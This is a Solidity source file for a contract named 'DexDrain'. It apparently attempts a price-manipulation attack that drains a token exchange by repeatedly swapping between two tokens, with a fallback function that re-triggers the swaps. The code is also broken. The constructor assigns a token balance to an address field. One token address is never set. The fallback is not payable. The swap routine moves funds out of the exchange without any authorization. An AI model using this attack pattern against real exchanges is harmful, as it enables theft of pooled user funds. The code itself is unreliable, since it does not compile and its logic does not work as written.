pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

contract DexDrain {
    address public token1;
    address public token2;
    address public dex;

    constructor(address _dex) {
        dex = _dex;
        // Determine which token is which from the Dex instance
        token1 = IERC20(_dex).balanceOf(address(this)) > 0
            ?IERC20(_dex).balanceOf(address(this))
            :IERC20(_dex).balanceOf(address(this)); // Simplified for example
    }

    function swapTokens() public {
        address user = msg.sender;
        uint256 amount = IERC20(token1).balanceOf(user) - 10; // Leave 10 for example

        // First swap token1 to token2
        swap(token1, token2, amount);

        // Next swap token2 to token1 using new balances
        swap(token2, token1, IERC20(token2).balanceOf(user) - 10);
    }

    function swap(address from, address to, uint256 amount) internal {
        IERC20(from).transferFrom(msg.sender, dex, amount);
        uint256 fromBalance = IERC20(from).balanceOf(dex);
        uint256 toBalance = IERC20(to).balanceOf(dex);
        uint256 swapAmount = (amount * toBalance) / fromBalance;
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap in");
        IERC20(to).approve(dex, swapAmount);
        IERC20(to).transferFrom(dex, msg.sender, swapAmount);
    }

    // Fallback to trigger additional swaps
    receive() external {
        swapTokens();
    }
}
